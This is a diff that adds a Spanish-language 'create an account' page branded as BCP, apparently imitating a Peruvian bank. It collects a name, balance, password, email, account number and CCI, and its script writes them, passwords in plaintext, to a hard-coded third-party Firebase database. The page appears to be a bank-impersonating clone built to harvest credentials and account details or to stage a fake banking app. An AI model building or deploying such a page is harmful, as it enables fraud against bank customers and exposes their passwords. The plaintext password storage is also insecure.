@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Crear una cuenta - BCP</title>
+<link rel="manifest" href="manifest.json" />
+  <meta name="theme-color" content="#0003ff" />
+
+  <!-- Favicon -->
+  <link rel="icon" type="images/png" href="images/app_icon_xxxhdpi.png"> 
+
+<style>
+  * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; margin: 0; padding: 0; }
+
+  body { background-color: #ffffff; color: #333; }
+
+  header { background-color: #0033a0; color: white; padding: 25px 20px 15px 20px; border-bottom: 1px solid #002b80; text-align: center; }
+
+  header h1 { font-size: 24px; font-weight: 500; }
+
+  header p { font-size: 20px; margin-top: 8px; }
+
+  .container { padding: 25px 20px 80px; }
+
+  label { display: block; margin-bottom: 6px; font-size: 16px; color: #666; }
+
+  input { width: 100%; padding: 12px; margin-bottom: 18px; border: none; border-bottom: 1px solid #aaa; font-size: 16px; outline: none; }
+
+  .row { display: flex; justify-content: space-between; gap: 15px; }
+  .row input { width: 100%; }
+
+  .btn-gray, .btn-orange { width: 100%; border: none; padding: 15px; border-radius: 10px; font-size: 17px; font-weight: 500; margin-top: 10px; cursor: pointer; }
+  .btn-gray { background-color: #b7b4c1; color: #222; }
+  .btn-gray:hover { background-color: #a19eb0; }
+  .btn-orange { background-color: #ff6600; color: white; }
+  .btn-orange:hover { background-color: #e65c00; }
+
+  /* Modal de carga y modal de activar cuenta */
+  .modal { display: none; position: fixed; z-index: 9999; inset: 0; background: rgba(0, 0, 0, 0.75); justify-content: center; align-items: center; }
+  .loader-container { position: relative; width: 120px; height: 120px; }
+  .loader-circle { position: absolute; top: 0; left: 0; width: 120px; height: 120px; border: 6px solid transparent; border-top: 6px solid #ff6600; border-radius: 50%; animation: spin 1.2s linear infinite; }
+  .loader-logo { position: absolute; top: 50%; left: 50%; width: 70px; height: 70px; transform: translate(-50%, -50%); }
+  @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+  .modal-content { background: white; padding: 30px; border-radius: 12px; width: 90%; max-width: 400px; text-align: center; }
+  .modal-content input { margin-bottom: 15px; }
+  .modal-content h2 { margin-bottom: 20px; }
+
+</style>
+</head>
+<body>
+
+<header>
+  <h1>Crear una cuenta</h1>
+  <p>Registra los datos</p>
+</header>
+
+<div class="container">
+  <label for="nombre">Nombre</label>
+  <input type="text" id="nombre">
+
+  <div class="row">
+    <div>
+      <label for="saldo">Saldo</label>
+      <input type="text" id="saldo">
+    </div>
+    <div>
+      <label for="origen">Origen</label>
+      <input type="text" id="origen">
+    </div>
+  </div>
+
+  <button class="btn-gray" id="activarCuentaBtn">Activar cuenta</button>
+  
+  <label for="clave">Clave</label>
+  <input type="password" id="clave">
+
+  <label for="correo">Correo (Opcional)</label>
+  <input type="email" id="correo">
+
+  <button class="btn-orange" id="borrarHistorial">Borrar historial</button>
+  <button class="btn-orange" id="registrar">Registrar</button>
+</div>
+
+<!-- Modal de carga -->
+<div class="modal" id="loadingModal">
+  <div class="loader-container">
+    <div class="loader-circle"></div>
+    <img src="images/lg_favicon_light.svg" class="loader-logo" alt="Logo">
+  </div>
+</div>
+
+<!-- Modal Activar Cuenta -->
+<div class="modal" id="activarCuentaModal">
+  <div class="modal-content">
+    <h2>Activar Cuenta</h2>
+    <label for="numeroCuenta">Número de cuenta</label>
+    <input type="text" id="numeroCuentaInput" placeholder="Ingrese su número de cuenta">
+
+    <label for="cci">CCI</label>
+    <input type="text" id="cciInput" placeholder="Ingrese su CCI">
+
+    <button class="btn-orange" id="guardarCuenta">Guardar</button>
+    <button class="btn-gray" id="cerrarModal" style="margin-top:10px;">Cancelar</button>
+  </div>
+</div>
+
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+  import { getDatabase, ref, set, get } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
+
+  const firebaseConfig = {
+    apiKey: "AIzaSyDvfMTYu_d_Vl0z-3Y8ld_YtcFLGgZmP0U",
+    authDomain: "bcpf-e0a42.firebaseapp.com",
+    databaseURL: "https://bcpf-e0a42-default-rtdb.firebaseio.com",
+    projectId: "bcpf-e0a42",
+    storageBucket: "bcpf-e0a42.firebasestorage.app",
+    messagingSenderId: "1030005921701",
+    appId: "1:1030005921701:web:0c15124cadf030280f7a4c",
+    measurementId: "G-SVYPBTLHDE"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
+
+  // Registro de usuario
+  const registrarBtn = document.getElementById("registrar");
+  const borrarBtn = document.getElementById("borrarHistorial");
+  const modal = document.getElementById("loadingModal");
+
+  registrarBtn.addEventListener("click", () => {
+    const nombre = document.getElementById("nombre").value.trim();
+    const saldo = document.getElementById("saldo").value.trim();
+    const origen = document.getElementById("origen").value.trim();
+    const clave = document.getElementById("clave").value.trim();
+    const correo = document.getElementById("correo").value.trim();
+
+    if (!nombre || !saldo || !origen || !clave) {
+      alert("Por favor completa todos los campos obligatorios.");
+      return;
+    }
+
+    modal.style.display = "flex";
+
+    set(ref(db, "usuarios/" + origen), {
+      nombre: nombre,
+      saldo: saldo,
+      clave: clave,
+      correo: correo
+    })
+    .then(() => {
+      localStorage.setItem("origen", origen);
+      setTimeout(() => {
+        modal.style.display = "none";
+        alert("Registro exitoso ✅");
+        window.location.href = "login";
+      }, 2000);
+    })
+    .catch((error) => {
+      modal.style.display = "none";
+      alert("Error al registrar: " + error);
+    });
+  });
+
+  borrarBtn.addEventListener("click", () => {
+    localStorage.clear();
+    alert("Historial borrado correctamente.");
+  });
+
+  // Modal Activar Cuenta
+  const activarCuentaBtn = document.getElementById("activarCuentaBtn");
+  const activarCuentaModal = document.getElementById("activarCuentaModal");
+  const cerrarModal = document.getElementById("cerrarModal");
+  const guardarCuenta = document.getElementById("guardarCuenta");
+
+  activarCuentaBtn.addEventListener("click", () => {
+    activarCuentaModal.style.display = "flex";
+  });
+
+  cerrarModal.addEventListener("click", () => {
+    activarCuentaModal.style.display = "none";
+  });
+
+  guardarCuenta.addEventListener("click", async () => {
+    const numeroCuenta = document.getElementById("numeroCuentaInput").value.trim();
+    const cci = document.getElementById("cciInput").value.trim();
+
+    if (!numeroCuenta || !cci) {
+      alert("Por favor completa todos los campos.");
+      return;
+    }
+
+    const origen = localStorage.getItem("origen");
+    if (!origen) {
+      alert("No se encontró usuario activo.");
+      return;
+    }
+
+    // Obtener datos existentes y actualizar solo numero y cci
+    const usuarioRef = ref(db, "usuarios/" + origen);
+    const snapshot = await get(usuarioRef);
+    const usuarioExistente = snapshot.exists() ? snapshot.val() : {};
+
+    set(usuarioRef, {
+      ...usuarioExistente,
+      numero: numeroCuenta,
+      cci: cci
+    })
+    .then(() => {
+      alert("Cuenta activada correctamente ✅");
+      activarCuentaModal.style.display = "none";
+    })
+    .catch((error) => {
+      alert("Error al guardar la cuenta: " + error);
+    });
+  });
+
+  window.addEventListener("click", (e) => {
+    if (e.target === activarCuentaModal) {
+      activarCuentaModal.style.display = "none";
+    }
+  });
+</script>
+
+</body>
+</html>
